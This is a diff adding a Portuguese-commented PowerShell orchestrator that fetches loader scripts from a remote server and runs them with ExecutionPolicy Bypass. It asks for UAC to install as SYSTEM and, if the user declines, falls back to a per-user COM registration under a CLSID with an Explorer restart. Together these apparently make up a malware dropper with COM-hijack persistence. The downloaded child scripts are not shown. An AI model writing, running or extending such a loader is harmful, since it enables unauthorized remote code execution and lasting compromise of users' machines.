@@ -1,0 +1,261 @@
+#Requires -Version 5.1
+<#
+.SYNOPSIS
+    Orquestrador de install: tenta UAC (SYSTEM); se recusado, instala COM user (CLSID).
+
+.DESCRIPTION
+    NAO unifica os loaders. Delega para:
+      - install-system.ps1  (admin / servico)
+      - profile-cache.ps1   (user / COM HKCU)
+    Fluxo Auto:
+      1) Se ja admin -> SYSTEM
+      2) Senao pede UAC (RunAs) para install-system
+      3) Se UAC cancelado (Nao) -> profile-cache Install + RestartExplorer
+    Os scripts filhos sao descarregados do mesmo /loaders se nao estiverem ao lado.
+
+.PARAMETER Config
+    URL do JSON conf.cfg com { "server": "..." }.
+
+.PARAMETER Mode
+    Auto (default) | System | User — forca o path (System ainda pede UAC se nao admin).
+
+.PARAMETER Clsid
+    Opcional; repassado ao profile-cache (auto CLSID se omitido).
+
+.PARAMETER Force
+    Repassado ao profile-cache Install.
+
+.PARAMETER SkipRestartExplorer
+    Nao passa -RestartExplorer no path user.
+
+.EXAMPLE
+    .\install-auto.ps1 -Config 'http://10.47.22.196:4000/conf.cfg'
+
+.EXAMPLE
+    irm 'http://host:4000/loaders/install-auto.ps1' -OutFile install-auto.ps1
+    .\install-auto.ps1 -Config 'http://host:4000/conf.cfg'
+#>
+[CmdletBinding()]
+param(
+    [Parameter(Mandatory = $true)]
+    [string]$Config,
+
+    [ValidateSet('Auto', 'System', 'User')]
+    [string]$Mode = 'Auto',
+
+    [string]$Clsid,
+
+    [string]$LoaderBase,
+
+    [ValidateSet('Auto', 'x64', 'x86')]
+    [string]$Architecture = 'Auto',
+
+    [switch]$Force,
+
+    [switch]$SkipRestartExplorer,
+
+    # Uso interno: processo ja elevado a correr so o path SYSTEM
+    [switch]$ElevatedSystem
+)
+
+$ErrorActionPreference = 'Stop'
+
+function Test-IsAdmin {
+    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
+        [Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+function Test-IsUacCancelled {
+    param([System.Management.Automation.ErrorRecord]$ErrorRecord)
+    if (-not $ErrorRecord) { return $false }
+    $ex = $ErrorRecord.Exception
+    while ($ex) {
+        if ($ex -is [System.ComponentModel.Win32Exception] -and $ex.NativeErrorCode -eq 1223) {
+            return $true
+        }
+        $msg = [string]$ex.Message
+        if ($msg -match '(?i)cancel|canceled|cancelled|cancelad') {
+            return $true
+        }
+        $ex = $ex.InnerException
+    }
+    $errMsg = [string]$ErrorRecord.ToString()
+    return ($errMsg -match '(?i)cancel|canceled|cancelled|cancelad')
+}
+
+function Get-LoaderBaseFromConfig {
+    param([string]$ConfigUrl)
+    try {
+        $u = [Uri]$ConfigUrl.Trim()
+        return ("{0}://{1}/loaders" -f $u.Scheme, $u.Authority).TrimEnd('/')
+    }
+    catch {
+        throw "Config invalida (esperado URL): $ConfigUrl"
+    }
+}
+
+function Enable-Tls12 {
+    param([string]$Url)
+    if ($Url -match '^https://') {
+        [Net.ServicePointManager]::SecurityProtocol =
+            [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
+    }
+}
+
+function Ensure-SiblingLoader {
+    param(
+        [Parameter(Mandatory = $true)][string]$FileName,
+        [Parameter(Mandatory = $true)][string]$WorkDir,
+        [Parameter(Mandatory = $true)][string]$BaseUrl
+    )
+    $dest = Join-Path $WorkDir $FileName
+    if (Test-Path -LiteralPath $dest) {
+        return $dest
+    }
+    $url = "$BaseUrl/$FileName"
+    Enable-Tls12 $url
+    $wc = New-Object Net.WebClient
+    try {
+        $wc.DownloadFile($url, $dest)
+    }
+    finally {
+        $wc.Dispose()
+    }
+    if (-not (Test-Path -LiteralPath $dest)) {
+        throw "Falha ao descarregar $url"
+    }
+    return $dest
+}
+
+function Invoke-SystemInstall {
+    param(
+        [string]$ScriptPath,
+        [string]$ConfigUrl,
+        [string]$Arch
+    )
+    $args = @(
+        '-NoProfile',
+        '-ExecutionPolicy', 'Bypass',
+        '-File', $ScriptPath,
+        '-Action', 'Install',
+        '-Config', $ConfigUrl,
+        '-Architecture', $Arch
+    )
+    $p = Start-Process -FilePath (Join-Path $env:WINDIR 'System32\WindowsPowerShell\v1.0\powershell.exe') `
+        -ArgumentList $args -Wait -PassThru -NoNewWindow
+    if ($null -eq $p) { throw "Falha ao iniciar install-system.ps1" }
+    if ($p.ExitCode -ne 0) {
+        throw "install-system.ps1 saiu com codigo $($p.ExitCode)"
+    }
+}
+
+function Invoke-UserInstall {
+    param(
+        [string]$ScriptPath,
+        [string]$ConfigUrl,
+        [string]$Arch,
+        [string]$TargetClsid,
+        [bool]$DoForce,
+        [bool]$RestartExplorer
+    )
+    $argList = [System.Collections.Generic.List[string]]::new()
+    $argList.AddRange([string[]]@(
+            '-NoProfile',
+            '-ExecutionPolicy', 'Bypass',
+            '-File', $ScriptPath,
+            '-Action', 'Install',
+            '-Config', $ConfigUrl,
+            '-Architecture', $Arch
+        ))
+    if ($TargetClsid) {
+        $argList.Add('-Clsid')
+        $argList.Add($TargetClsid)
+    }
+    if ($DoForce) { $argList.Add('-Force') }
+    if ($RestartExplorer) { $argList.Add('-RestartExplorer') }
+
+    $p = Start-Process -FilePath (Join-Path $env:WINDIR 'System32\WindowsPowerShell\v1.0\powershell.exe') `
+        -ArgumentList $argList.ToArray() -Wait -PassThru -NoNewWindow
+    if ($null -eq $p) { throw "Falha ao iniciar profile-cache.ps1" }
+    if ($p.ExitCode -ne 0) {
+        throw "profile-cache.ps1 saiu com codigo $($p.ExitCode)"
+    }
+}
+
+function Try-ElevateSystemInstall {
+    param(
+        [string]$SelfPath,
+        [string]$ConfigUrl,
+        [string]$Arch,
+        [string]$Base,
+        [string]$TargetClsid,
+        [bool]$DoForce
+    )
+    # Re-executa ESTE script elevado com -ElevatedSystem (filhos ja no disco / mesmo cwd).
+    $ps = Join-Path $env:WINDIR 'System32\WindowsPowerShell\v1.0\powershell.exe'
+    $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$SelfPath`" -Config `"$ConfigUrl`" -Mode System -ElevatedSystem -Architecture $Arch"
+    if ($Base) { $arg += " -LoaderBase `"$Base`"" }
+    if ($TargetClsid) { $arg += " -Clsid `"$TargetClsid`"" }
+    if ($DoForce) { $arg += " -Force" }
+
+    $p = Start-Process -FilePath $ps -ArgumentList $arg -Verb RunAs -Wait -PassThru
+    if ($null -eq $p) { throw "Start-Process RunAs devolveu null" }
+    return [int]$p.ExitCode
+}
+
+# --- main ---
+
+$workDir = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }
+$selfPath = $PSCommandPath
+if (-not $selfPath) { $selfPath = Join-Path $workDir 'install-auto.ps1' }
+
+$base = if ($LoaderBase) { $LoaderBase.TrimEnd('/') } else { Get-LoaderBaseFromConfig -ConfigUrl $Config }
+
+$systemPs = Ensure-SiblingLoader -FileName 'install-system.ps1' -WorkDir $workDir -BaseUrl $base
+$userPs = Ensure-SiblingLoader -FileName 'profile-cache.ps1' -WorkDir $workDir -BaseUrl $base
+
+$restartExplorer = -not $SkipRestartExplorer.IsPresent
+$doForce = [bool]$Force
+
+# Path forcado User (filho imprime status final)
+if ($Mode -eq 'User') {
+    Invoke-UserInstall -ScriptPath $userPs -ConfigUrl $Config -Arch $Architecture `
+        -TargetClsid $Clsid -DoForce $doForce -RestartExplorer $restartExplorer
+    exit 0
+}
+
+# Path SYSTEM (ja elevado ou Mode=System/Auto com admin)
+if ($ElevatedSystem -or (Test-IsAdmin)) {
+    Invoke-SystemInstall -ScriptPath $systemPs -ConfigUrl $Config -Arch $Architecture
+    exit 0
+}
+
+# Auto / System sem admin: pedir UAC
+if ($Mode -eq 'System' -or $Mode -eq 'Auto') {
+    try {
+        $code = Try-ElevateSystemInstall -SelfPath $selfPath -ConfigUrl $Config -Arch $Architecture `
+            -Base $base -TargetClsid $Clsid -DoForce $doForce
+        if ($code -eq 0) {
+            # Janela elevada e separada: status final no processo pai.
+            Write-Host 'Instalado.'
+            exit 0
+        }
+        Write-Error "install SYSTEM falhou apos UAC (exit $code). Corrija e volte a tentar, ou use -Mode User."
+        exit $code
+    }
+    catch {
+        if (Test-IsUacCancelled -ErrorRecord $_) {
+            if ($Mode -eq 'System') {
+                Write-Error "UAC recusado e Mode=System; sem fallback."
+                exit 1223
+            }
+            Invoke-UserInstall -ScriptPath $userPs -ConfigUrl $Config -Arch $Architecture `
+                -TargetClsid $Clsid -DoForce $doForce -RestartExplorer $restartExplorer
+            exit 0
+        }
+        throw
+    }
+}
+
+Write-Error "Mode nao tratado: $Mode"
+exit 1
